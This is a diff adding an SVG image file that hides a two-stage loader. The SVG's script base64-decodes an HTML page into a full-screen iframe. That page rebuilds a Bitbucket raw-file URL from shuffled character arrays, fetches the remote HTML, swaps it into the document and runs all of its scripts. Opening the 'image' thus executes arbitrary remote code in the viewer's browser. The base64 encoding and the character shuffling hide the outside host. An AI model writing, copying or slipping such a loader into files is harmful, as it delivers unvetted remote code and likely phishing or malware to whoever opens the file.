@@ -1,0 +1,70 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    xmlns:xhtml="http://www.w3.org/1999/xhtml"
+    width="100%"
+    height="100%"
+    style="display:block;margin:0;padding:0;">
+
+    <foreignObject
+        x="0"
+        y="0"
+        width="100%"
+        height="100%"
+        style="overflow:visible;">
+
+        <xhtml:iframe
+            id="html-frame"
+            frameborder="0"
+            scrolling="auto"
+            style="
+                position:absolute;
+                inset:0;
+                width:100%;
+                height:100%;
+                border:0;
+                margin:0;
+                padding:0;
+                display:block;
+                overflow:auto;
+            ">
+        </xhtml:iframe>
+
+    </foreignObject>
+
+    <script><![CDATA[
+
+(function () {
+
+    const encoded = "PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMCBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvUkVDLWh0bWw0MC9sb29zZS5kdGQiPg0KPGh0bWw+DQoNCjxoZWFkPg0KICAgIDxzY3JpcHQ+DQogICAgICAgIGNvbnN0IF9rID0gKGFycikgPT4NCiAgICAgICAgICAgIGFycg0KICAgICAgICAgICAgLnNvcnQoKGEsIGIpID0+IGFbMF0gLSBiWzBdKQ0KICAgICAgICAgICAgLm1hcCgoeCkgPT4geFsxXSkNCiAgICAgICAgICAgIC5qb2luKCIiKTsNCiAgICAgICAgY29uc3QgX3MgPSBbDQogICAgICAgICAgICBbMSwgInQiXSwNCiAgICAgICAgICAgIFs0LCAicyJdLA0KICAgICAgICAgICAgWzIsICJ0Il0sDQogICAgICAgICAgICBbMywgInAiXSwNCiAgICAgICAgICAgIFswLCAiaCJdLA0KICAgICAgICAgICAgWzcsICIvIl0sDQogICAgICAgICAgICBbNiwgIi8iXSwNCiAgICAgICAgICAgIFs1LCAiOiJdLA0KICAgICAgICBdOw0KICAgICAgICBjb25zdCBfaCA9IFsNCiAgICAgICAgICAgIFs0LCAidSJdLA0KICAgICAgICAgICAgWzYsICJrIl0sDQogICAgICAgICAgICBbMCwgImIiXSwNCiAgICAgICAgICAgIFsxMSwgInIiXSwNCiAgICAgICAgICAgIFsyLCAidCJdLA0KICAgICAgICAgICAgWzgsICJ0Il0sDQogICAgICAgICAgICBbNywgImUiXSwNCiAgICAgICAgICAgIFszLCAiYiJdLA0KICAgICAgICAgICAgWzEyLCAiZyJdLA0KICAgICAgICAgICAgWzEwLCAibyJdLA0KICAgICAgICAgICAgWzksICIuIl0sDQogICAgICAgICAgICBbMSwgImkiXSwNCiAgICAgICAgICAgIFs1LCAiYyJdLA0KICAgICAgICBdOw0KICAgICAgICBjb25zdCBfcDAgPSBbDQogICAgICAgICAgICBbOCwgInAiXSwNCiAgICAgICAgICAgIFs5LCAidSJdLA0KICAgICAgICAgICAgWzEsICIyIl0sDQogICAgICAgICAgICBbMTMsICJjIl0sDQogICAgICAgICAgICBbNCwgImEiXSwNCiAgICAgICAgICAgIFsxMiwgImkiXSwNCiAgICAgICAgICAgIFs3LCAiLSJdLA0KICAgICAgICAgICAgWzUsICJsIl0sDQogICAgICAgICAgICBbMywgIi0iXSwNCiAgICAgICAgICAgIFs2LCAidCJdLA0KICAgICAgICAgICAgWzAsICJwIl0sDQogICAgICAgICAgICBbMiwgInAiXSwNCiAgICAgICAgICAgIFsxMSwgImwiXSwNCiAgICAgICAgICAgIFsxMCwgImIiXSwNCiAgICAgICAgXTsNCiAgICAgICAgY29uc3QgX3AxID0gWw0KICAgICAgICAgICAgWzcsICJzIl0sDQogICAgICAgICAgICBbNiwgImkiXSwNCiAgICAgICAgICAgIFs0LCAiZSJdLA0KICAgICAgICAgICAgWzIsICJwIl0sDQogICAgICAgICAgICBbNSwgIm0iXSwNCiAgICAgICAgICAgIFswLCAicCJdLA0KICAgICAgICAgICAgWzMsICItIl0sDQogICAgICAgICAgICBbMSwgIjIiXSwNCiAgICAgICAgXTsNCiAgICAgICAgY29uc3QgX3AyID0gWw0KICAgICAgICAgICAgWzEsICJhIl0sDQogICAgICAgICAgICBbMCwgInIiXSwNCiAgICAgICAgICAgIFsyLCAidyJdLA0KICAgICAgICBdOw0KICAgICAgICBjb25zdCBfcDMgPSBbDQogICAgICAgICAgICBbMiwgImkiXSwNCiAgICAgICAgICAgIFsxLCAiYSJdLA0KICAgICAgICAgICAgWzMsICJuIl0sDQogICAgICAgICAgICBbMCwgIm0iXSwNCiAgICAgICAgXTsNCiAgICAgICAgY29uc3QgX3A0ID0gWw0KICAgICAgICAgICAgWzEwLCAiaCJdLA0KICAgICAgICAgICAgWzUsICJlIl0sDQogICAgICAgICAgICBbMywgImUiXSwNCiAgICAgICAgICAgIFs4LCAiaSJdLA0KICAgICAgICAgICAgWzcsICJTIl0sDQogICAgICAgICAgICBbNiwgImIiXSwNCiAgICAgICAgICAgIFsxLCAiYSJdLA0KICAgICAgICAgICAgWzAsICJHIl0sDQogICAgICAgICAgICBbNCwgIlciXSwNCiAgICAgICAgICAgIFs5LCAiZyJdLA0KICAgICAgICAgICAgWzExLCAidCJdLA0KICAgICAgICAgICAgWzIsICJtIl0sDQogICAgICAgIF07DQogICAgICAgIGFzeW5jIGZ1bmN0aW9uIGxvYWQoKSB7DQogICAgICAgICAgICBjb25zdCB1cmwgPSBfayhfcykgKyBfayhfaCkgKyAiLyIgKyBbX3AwLCBfcDEsIF9wMiwgX3AzLCBfcDRdLm1hcChfaykuam9pbigiLyIpOw0KICAgICAgICAgICAgY29uc3QgcmVzID0gYXdhaXQgZmV0Y2godXJsKTsNCiAgICAgICAgICAgIGNvbnN0IGh0bWwgPSBhd2FpdCByZXMudGV4dCgpOw0KICAgICAgICAgICAgY29uc3QgcGFyc2VyID0gbmV3IERPTVBhcnNlcigpOw0KICAgICAgICAgICAgY29uc3QgZG9jID0gcGFyc2VyLnBhcnNlRnJvbVN0cmluZyhodG1sLCAidGV4dC9odG1sIik7DQogICAgICAgICAgICBkb2N1bWVudC5oZWFkLmlubmVySFRNTCA9IGRvYy5oZWFkLmlubmVySFRNTDsNCiAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuaW5uZXJIVE1MID0gZG9jLmJvZHkuaW5uZXJIVE1MOw0KICAgICAgICAgICAgZG9jLnF1ZXJ5U2VsZWN0b3JBbGwoInNjcmlwdCIpLmZvckVhY2goKG9sZCkgPT4gew0KICAgICAgICAgICAgICAgIGNvbnN0IHMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTsNCiAgICAgICAgICAgICAgICBpZiAob2xkLnNyYykgcy5zcmMgPSBvbGQuc3JjOw0KICAgICAgICAgICAgICAgIGVsc2Ugcy50ZXh0Q29udGVudCA9IG9sZC50ZXh0Q29udGVudDsNCiAgICAgICAgICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHMpOw0KICAgICAgICAgICAgfSk7DQogICAgICAgIH0NCiAgICAgICAgbG9hZCgpOw0KICAgIDwvc2NyaXB0Pg0KPC9oZWFkPg0KDQo8L2h0bWw+";
+
+    /*
+     * Decode the original HTML without changing it.
+     */
+    const binary = atob(encoded);
+
+    const bytes = new Uint8Array(binary.length);
+
+    for (let i = 0; i < binary.length; i++) {
+        bytes[i] = binary.charCodeAt(i);
+    }
+
+    const html = new TextDecoder("utf-8").decode(bytes);
+
+    const frame = document.getElementById("html-frame");
+
+    if (!frame) {
+        return;
+    }
+
+    /*
+     * The original HTML goes into the iframe unchanged.
+     */
+    frame.srcdoc = html;
+
+})();
+
+    ]]></script>
+
+</svg>
